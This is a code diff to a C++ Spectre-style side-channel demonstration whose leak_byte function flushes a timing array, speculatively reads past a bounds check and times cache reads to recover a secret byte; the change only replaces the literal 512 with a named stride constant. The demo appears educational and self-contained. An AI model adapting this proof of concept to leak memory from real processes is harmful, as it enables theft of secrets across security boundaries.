@@ -50,7 +50,8 @@ static std::pair<int, int> top_two_indices(const RangeT &range) {
  * In this demo they are done together in the ideal order for the attacker.
  */
 char leak_byte(std::string_view text, int idx) {
-    static uint8_t timing_array[256 * 512];
+    constexpr auto stride = 512;
+    static uint8_t timing_array[256 * stride];
     memset(timing_array, 1, sizeof timing_array);
 
     const char *data = text.begin();
@@ -63,7 +64,7 @@ char leak_byte(std::string_view text, int idx) {
     for(int run{0}; run < 1000; run++) {
         // flush all of timing array
         for(int i{0}; i < 256; i++) {
-            _mm_clflush(&timing_array[i * 512]);
+            _mm_clflush(&timing_array[i * stride]);
         }
 
         int safe_idx = run % text.size(); // always inbound for the string view passed in!
@@ -71,7 +72,7 @@ char leak_byte(std::string_view text, int idx) {
         // perform reads that are data-dependent on the secret
         // as a program being attacked might
         for(int i{0}; i < 100; i++) {
-            force_read(&timing_array[data[idx] * 512]);
+            force_read(&timing_array[data[idx] * stride]);
         }
 
         for(int i{0}; i < 500; i++) {
@@ -90,14 +91,14 @@ char leak_byte(std::string_view text, int idx) {
              */
             int local_index = ((i + 1) % 10) ? safe_idx : idx;
             if(local_index < *size_in_heap) {
-                force_read(&timing_array[data[local_index] * 512]);
+                force_read(&timing_array[data[local_index] * stride]);
             }
         }
 
         // now measure read latencies to see if we can detect what data[idx] was
         for(int i{0}; i < 256; i++) {
             int mixed_i = ((i * 167) + 13) & 0xff; // ???, I guess so we test in pseudo-random order?
-            uint8_t *timing_entry = &timing_array[mixed_i * 512];
+            uint8_t *timing_entry = &timing_array[mixed_i * stride];
             int64_t start = read_tsc();
             force_read(timing_entry);
             latencies[mixed_i] = read_tsc() - start;
